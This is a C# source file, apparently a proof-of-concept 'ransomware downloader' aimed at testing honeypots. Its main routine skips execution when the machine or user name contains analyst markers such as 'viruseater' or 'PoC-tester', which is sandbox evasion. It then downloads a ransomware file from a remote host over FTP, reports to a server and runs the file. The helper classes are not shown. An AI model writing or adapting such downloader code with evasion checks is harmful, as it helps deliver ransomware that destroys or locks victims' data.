using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace HoneyPot10POCRansomwareDownloader
{
    class Program
    {
        static void Main(string[] args)
        {
            ransomwareDownload();
        }

        public static void ransomwareDownload()
        {
            if (Environment.MachineName.Contains("viruseater")) return;
            if (Environment.UserName.Contains("viruseater")) return;
            if (Environment.UserName.Contains("PoC-tester")) return;
            Thread.Sleep(2000);
            serverCommunicator.setRansomwareFilePath();
            serverCommunicator.getPoCHost();
            Thread.Sleep(100);
            Console.WriteLine(serverCommunicator.getNAMEONTEST());
            Thread.Sleep(100);
            //Install ransomware

            serverCommunicator.downloadFileFTP();

            Thread.Sleep(100);

            serverCommunicator.postPoCStarted();

            Thread.Sleep(100);

            programExecuter.executeProgram(serverCommunicator.getRansomwareFilePath());

            Thread.Sleep(30000);
            //Play ransomware
        }
    }
}
